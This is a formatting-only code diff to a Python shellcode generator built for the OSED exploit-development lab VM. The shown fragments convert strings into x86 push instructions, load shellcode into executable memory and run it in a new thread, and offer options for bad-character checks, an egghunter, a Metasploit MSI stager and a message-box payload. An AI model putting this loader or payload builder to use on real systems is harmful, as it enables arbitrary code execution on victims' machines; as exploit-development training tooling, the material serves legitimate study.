@@ -57,7 +57,7 @@ def push_string(input_string):
     for i in range(rev_hex_payload_len, 0, -1):
         # add every 4 byte (8 chars) to one push statement
         if (i != 0) and ((i % 8) == 0):
-            target_bytes = rev_hex_payload[i - 8 : i]
+            target_bytes = rev_hex_payload[i - 8:i]
             instructions.append(
                 f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};"
             )
@@ -69,22 +69,18 @@ def push_string(input_string):
                 )
                 first_instructions.append("push eax;")
             elif rev_hex_payload_len % 8 == 4:
-                target_bytes = rev_hex_payload[
-                    (rev_hex_payload_len - (rev_hex_payload_len % 8)) :
-                ]
+                target_bytes = rev_hex_payload[(rev_hex_payload_len -
+                                                (rev_hex_payload_len % 8)):]
                 first_instructions.append(
-                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};"
-                )
+                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
                 first_instructions.append("push eax;")
             else:
-                target_bytes = rev_hex_payload[
-                    (rev_hex_payload_len - (rev_hex_payload_len % 8)) :
-                ]
+                target_bytes = rev_hex_payload[(rev_hex_payload_len -
+                                                (rev_hex_payload_len % 8)):]
                 first_instructions.append(f"mov al, 0x{target_bytes[4:6]};")
                 first_instructions.append("push eax;")
                 first_instructions.append(
-                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};"
-                )
+                    f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
                 first_instructions.append("push ax;")
             null_terminated = True
 
@@ -713,10 +709,10 @@ def main(args):
             ctypes.c_int(0x3000),
             ctypes.c_int(0x40),
         )
-        buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(packed_shellcode)
+        buf = (ctypes.c_char *
+               len(packed_shellcode)).from_buffer(packed_shellcode)
         ctypes.windll.kernel32.RtlMoveMemory(
-            ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode))
-        )
+            ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode)))
         print("[=]   Shellcode located at address %s" % hex(ptr))
         input("...ENTER TO EXECUTE SHELLCODE...")
         ht = ctypes.windll.kernel32.CreateThread(
@@ -727,13 +723,13 @@ def main(args):
             ctypes.c_int(0),
             ctypes.pointer(ctypes.c_int(0)),
         )
-        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
+                                                   ctypes.c_int(-1))
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
-        description="Creates shellcodes compatible with the OSED lab VM"
-    )
+        description="Creates shellcodes compatible with the OSED lab VM")
 
     parser.add_argument(
         "-l",
@@ -750,16 +746,18 @@ if __name__ == "__main__":
     parser.add_argument(
         "-b",
         "--bad-chars",
-        help="space separated list of bad chars to check for in final egghunter (default: 00)",
+        help=
+        "space separated list of bad chars to check for in final egghunter (default: 00)",
         default=["00"],
         nargs="+",
     )
-    parser.add_argument(
-        "-m", "--msi", help="use an msf msi exploit stager (short)", action="store_true"
-    )
-    parser.add_argument(
-        "--messagebox", help="create a message box payload", action="store_true"
-    )
+    parser.add_argument("-m",
+                        "--msi",
+                        help="use an msf msi exploit stager (short)",
+                        action="store_true")
+    parser.add_argument("--messagebox",
+                        help="create a message box payload",
+                        action="store_true")
     parser.add_argument("--mb-header", help="message box header text")
     parser.add_argument("--mb-text", help="message box text")
     parser.add_argument(
